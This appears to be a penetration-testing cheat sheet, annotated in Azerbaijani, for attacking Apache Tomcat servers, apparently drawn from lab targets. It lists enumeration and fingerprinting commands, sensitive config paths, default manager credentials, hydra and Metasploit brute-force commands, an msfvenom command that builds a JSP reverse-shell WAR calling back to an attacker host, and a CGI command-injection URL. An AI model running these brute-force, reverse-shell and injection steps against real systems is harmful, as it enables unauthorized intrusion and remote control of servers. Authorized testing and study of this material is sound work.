# Tomcat Enumeration
```powershell
curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat

nmap -sV -p 8080,8443,8009,8005 target.com
nmap -sV --script=tomcat* -p 8080 target.com
```

# Version Enumeration
```powershell
curl -s -I https://target.com:8080 | grep -i server
# Server: Apache-Coyote/1.1
# Server: Apache Tomcat/9.0.x

curl -s https://target.com:8080/invalidpage | grep -i tomcat
curl -s "https://target.com:8080/%24%7B%7D" | grep -i tomcat

curl -s https://target.com:8080/docs/ | grep -i version

curl -s https://target.com:8080/ | grep -i tomcat

curl -s https://target.com:8080/manager/html \
     -u admin:admin | grep -i tomcat
```
---
<img width="492" height="641" alt="image" src="https://github.com/user-attachments/assets/5d70e420-f885-4e88-8539-221800d591c4" />

# Main Paths
```powershell
# Default səhifələr
https://target.com:8080/
https://target.com:8080/index.jsp

# Manager & Admin panellər
https://target.com:8080/manager/html          # Web Application Manager
https://target.com:8080/manager/text          # Text-based Manager
https://target.com:8080/manager/status        # Server Status
https://target.com:8080/host-manager/html     # Virtual Host Manager
https://target.com:8080/admin/               # Admin Console (köhnə)

# Sənədlər
https://target.com:8080/docs/
https://target.com:8080/examples/

# Həssas fayllar
/conf/tomcat-users.xml
/conf/server.xml
/conf/web.xml
/conf/context.xml
/logs/catalina.out
/logs/localhost_access_log.txt
/webapps/ROOT/
```

# Default Credentials
```powershell
admin:admin
admin:password
admin:tomcat
tomcat:tomcat
tomcat:password
tomcat:s3cr3t
manager:manager
admin:
root:root
both:tomcat
```

# Brute Force
```powershell
# Manager panel brute force
hydra -L users.txt -P passwords.txt \
      target.com -s 8080 \
      http-get /manager/html

# Tək user
hydra -l admin -P rockyou.txt \
      target.com -s 8080 \
      http-get /manager/html

# HTTPS
hydra -l admin -P rockyou.txt \
      -s 8443 -S target.com \
      https-get /manager/html
```

# MSFCONSOLE
```powershell
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS target.com
set RPORT 8080
set TARGETURI /manager/html
set BRUTEFORCE_SPEED 5
run


msfvenom -p java/jsp_shell_reverse_tcp LHOST=[SİZİN_İP] LPORT=4444 -f war > shell.war
http://10.129.201.50:8080/shell/
```

# Directory Enumeration
```powershell
gobuster dir -u https://target.com:8080 \
             -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt \
             -x jsp,jspx,do,action \
             -t 30

gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
```

# Attacking Tomcat CGI
```powershell
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat

http://10.129.204.227:8080/cgi/welcome.bat?&dir
```
